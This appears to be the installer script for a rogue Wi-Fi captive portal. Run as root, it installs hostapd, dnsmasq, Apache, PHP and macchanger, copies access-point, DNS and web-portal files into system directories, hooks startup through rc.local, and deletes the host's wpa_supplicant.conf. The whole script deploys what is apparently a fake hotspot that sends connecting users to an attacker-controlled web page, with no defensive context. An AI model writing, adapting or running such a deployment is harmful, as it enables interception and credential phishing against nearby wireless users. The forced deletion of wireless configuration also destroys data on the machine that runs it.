#!/bin/sh -e

if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root." 1>&2
   exit 1
fi

echo "Installing dependencies..."
apt update
apt -y install macchanger hostapd dnsmasq apache2 php

echo "Configuring components..."
cp -f hostapd.conf /etc/hostapd/
cp -f dnsmasq.conf /etc/
cp -rf html /var/www/
chown -R www-data:www-data /var/www/html
chown root:www-data /var/www/html/.htaccess
cp -f rc.local /etc/
cp -f override.conf /etc/apache2/conf-available/
a2enconf override
a2enmod rewrite

echo "Deleting wireless network configuration..."
sudo rm -rf /etc/wpa_supplicant/wpa_supplicant.conf

echo "Rogue captive portal installed. Reboot to execute."
exit 0
